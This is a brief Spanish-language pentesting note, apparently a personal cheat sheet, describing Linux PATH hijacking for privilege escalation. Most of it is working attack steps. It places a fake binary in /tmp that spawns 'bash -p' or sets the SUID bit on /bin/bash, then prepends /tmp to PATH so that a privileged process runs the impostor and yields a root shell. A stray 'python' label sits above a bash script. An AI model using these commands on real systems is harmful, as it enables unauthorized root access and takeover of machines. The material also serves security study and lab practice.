Path Hijacking

El path hijacking ocurre cuando un proceso privilegiado ejecuta comandos por nombre relativo y podemos colocar un binario controlado antes en el PATH.

1. Localizar un archivo que ejecute/importe un comando usando la ruta relativa

2. Crear un binario controlado con el mismo nombre y modificar el PATH para que se ejecute

Crear binario a suplantar: Abrir una bash como root

echo "/bin/bash -p" > /tmp/<binario>

python

#!/bin/bash
chmod u+s /bin/bash

# Conexión a la bash como root: bash -p

Modificar el PATH para que cuando se ejecute el archivo lea nuestro binario y se ejecute

export PATH=/tmp:$PATH
